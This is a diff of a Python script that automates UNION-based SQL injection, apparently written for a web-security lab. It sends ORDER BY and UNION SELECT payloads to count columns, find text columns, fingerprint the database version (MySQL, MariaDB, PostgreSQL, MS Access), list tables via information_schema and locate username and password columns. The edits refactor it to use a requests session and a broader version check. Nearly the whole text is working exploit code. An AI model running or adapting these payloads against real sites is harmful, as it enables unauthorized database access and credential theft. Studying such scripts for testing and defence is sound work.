@@ -16,12 +16,12 @@ proxies = {
 session = requests.Session()
 
 def num_cols(url):
-    r = requests.get(url)
+    r = session.get(url)
     src_content = r.text
     print("[.] Finding number of columns...")
     for i in range(1,50):
         payload = "+ORDER+BY+%s--" %i
-        # r = requests.get(url+payload, verify=False, proxies=proxies)
+        # r = session.get(url+payload, verify=False, proxies=proxies)
         r = session.get(url+payload, verify=False)
         res = r.text
         if ( len(src_content) < len(res) ) or ( len(src_content) > len(res) ):
@@ -38,11 +38,11 @@ def string_cols(url, num_cols): #find columns that accepts text
         payload_list = ['NULL'] * num_cols
         payload_list[i-1] = test_string
         payload = "+UNION+SELECT+" + ','.join(payload_list) + "--"
-        # r = requests.get(url+payload, verify=False, proxies=proxies)
+        # r = session.get(url+payload, verify=False, proxies=proxies)
         r = session.get(url+payload, verify=False)
         if 'xyzwert' in r.text:
             text_cols[i-1]=i
-            print(text_cols)   
+    print(text_cols)   
     return text_cols
 
 def version_search(url, n_cols, text_cols):
@@ -50,21 +50,23 @@ def version_search(url, n_cols, text_cols):
     payload_list = ['NULL'] * n_cols
     payload_list[text_cols[1]] = 'version()'
     payload = "+UNION+SELECT+" + ','.join(payload_list) + "--"
-    # r = requests.get(url+payload, verify=False, proxies=proxies)
+    # r = session.get(url+payload, verify=False, proxies=proxies)
     r = session.get(url+payload, verify=False)
     res = r.text
     
     versions = {
-          "PostgreSQL",
-          "MariaDB"
+        "MySQL",
+        "MariaDB",
+        "PostgreSQL",
+        "MS Access"          
     }
 
     for version in versions:
-        # print(version)
+        print(version)
         if version in res:
             print ("[+] Found database version:")
             soup = BeautifulSoup(res, 'html.parser')
-            str_version = soup.find(string=re.compile('.*MariaDB.*')) 
+            str_version = soup.find(string=re.compile('.*' + version + '.*')) 
             print("[+] The database version is " + str_version)
             return True
         return False
@@ -75,7 +77,7 @@ def find_users_table(url, columns, text_cols):
     payload_list[text_cols[1]] = 'table_name'
     payload = "+UNION+SELECT+" + ','.join(payload_list) + "+FROM+information_schema.tables--"
     
-    # r = requests.get(url+payload, verify=False, proxies=proxies)
+    # r = session.get(url+payload, verify=False, proxies=proxies)
     r = session.get(url+payload, verify=False)
     res = r.text
     
@@ -93,7 +95,7 @@ def find_usrnm_passwd_cols(url, columns, text_cols, users):
     payload_list = ['NULL'] * columns
     payload_list[text_cols[1]] = 'column_name'
     payload = "+UNION+SELECT+" + ','.join(payload_list) + "+FROM+information_schema.columns+WHERE+table_name='%s'--" %users
-    # r = requests.get(url+payload, verify=False, proxies=proxies)
+    # r = session.get(url+payload, verify=False, proxies=proxies)
     r = session.get(url+payload, verify=False)
     res = r.text
     
